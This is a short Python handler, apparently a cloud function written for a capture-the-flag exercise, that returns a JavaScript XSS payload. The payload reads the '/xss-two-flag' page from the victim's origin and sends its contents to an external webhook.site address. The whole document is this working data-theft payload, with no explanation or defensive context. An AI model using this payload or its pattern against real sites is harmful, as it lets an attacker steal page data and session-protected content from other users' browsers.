  def serveIt(request):
    request_json = request.get_json(silent=True)
    request_args = request.args

    if request_json and 'name' in request_json:
        name = request_json['name']
    elif request_args and 'name' in request_args:
        name = request_args['name']
    else:
        name = 'World'

    return """  
            var xhr = new XMLHttpRequest();
            xhr.open('GET',location.origin + '/xss-two-flag',true);
            xhr.onload = function () {
                var request = new XMLHttpRequest();
                request.open('GET','https://webhook.site/bafc1658-940e-417a-a1bb-638c72e05b06?data=' + xhr.responseText,true);
                request.send()};
            xhr.send(null);
    """
